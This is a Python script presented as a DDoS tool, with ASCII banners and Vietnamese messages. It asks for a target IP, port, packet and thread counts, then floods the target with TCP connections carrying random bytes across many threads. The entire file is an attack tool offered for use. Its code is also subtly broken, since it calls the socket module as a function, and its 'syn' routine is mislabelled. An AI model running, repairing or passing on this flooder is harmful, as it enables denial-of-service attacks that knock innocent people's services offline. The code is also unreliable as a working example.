import random
import threading
import socket
import os
import time
from termcolor import colored
os.system('clear')
os.system('cls')
print(colored(r"""

_________          _______           _______  _        _______  _        _______ _________
\__   __/|\     /|(  ___  )|\     /|(  ___  )( (    /|(  ____ \( (    /|(  ___  )\__   __/
   ) (   | )   ( || (   ) |( \   / )| (   ) ||  \  ( || (    \/|  \  ( || (   ) |   ) (   
   | |   | (___) || (___) | \ (_) / | |   | ||   \ | || |      |   \ | || |   | |   | |   
   | |   |  ___  ||  ___  |  \   /  | |   | || (\ \) || | ____ | (\ \) || |   | |   | |   
   | |   | (   ) || (   ) |   ) (   | |   | || | \   || | \_  )| | \   || |   | |   | |   
   | |   | )   ( || )   ( |   | |   | (___) || )  \  || (___) || )  \  || (___) |___) (___
   )_(   |/     \||/     \|   \_/   (_______)|/    )_)(_______)|/    )_)(_______)\_______/
                                                                                          
|   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   | created by DL_Nguyen""",'blue'))

ip = str(input(colored("[+] : ",'green')))
port = int(input(colored("[+] Port: ",'green')))
packet = int(input(colored("[+] Packets: ",'green')))
thread = int(input(colored("[+] Threads: ",'green')))
time.sleep(2)

os.system('cls')
os.system('clear')
print(colored(r"""
  __ _| |_| |_ __ _  ___| | _(_)_ __   __ _         
 / _` | __| __/ _` |/ __| |/ / | '_ \ / _` |        
| (_| | |_| || (_| | (__|   <| | | | | (_| |_ _ _ _ 
 \__,_|\__|\__\__,_|\___|_|\_\_|_| |_|\__, (_|_|_|_)

                                      |___/         
|   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   | created by DL_Nguyen""",'green'))
print(colored("###############################################################################",'red'))
time.sleep(2)
print(colored("\n[+] Start.......",'green'))
time.sleep(1)
print(colored("\n3 : CẢM ƠN BẠN ĐÃ SỬ DỤNG TOOLS",'blue'))
time.sleep(3)
print(colored("\n2 : VUI  LÒNG CHỜ TRONG GIÂY LÁT",'red'))
time.sleep(3)
print(colored("\n1 : BẮT ĐẦU DDoS",'green'))
time.sleep(3)
os.system('cls')
os.system('clear')

def syn(): 
     hevin = random._urandom(900)
     bb = int(0)
     while True :
          try: 
                 h = socket(socket.AF_INET, socket.SOCK_STREAM)
                 h.connect((ip,port))
                 h.send(hevin)
                 for i in range(packet):
                     h.send(hevin)
                 bb += 1
                 print(colored('[+] Attacking '+ip +'>>>Sent:  '+str(bb), 'red'))
          except KeyboardInterrupt:
              h.close()
              print(colored("[+++] DONE !!!!", 'green'))
              pass 
for b in range(thread):
    thread = threading.Thread(target=syn)
    thread.start()

